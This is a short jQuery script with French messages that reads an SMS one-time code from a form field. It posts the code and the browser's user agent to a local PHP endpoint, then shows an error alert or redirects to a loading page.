$(function () {
$("#add_email").text(localStorage.user);
	});

function otp(){
	

var OTP	 =	$("#enter_OTP").val();

	//alert(OTP);
 if(OTP==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez entrer le code reçu par SMS"

})	

return false;	
} 



var data_log = 
{
DEVICE       : navigator.userAgent,
OTP		    :   OTP

}; 


var _url = '../config/otp.php';
$('#cover-spin').show(0);
$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	

  window.location="../admin/loading.html";
    

} 


})
}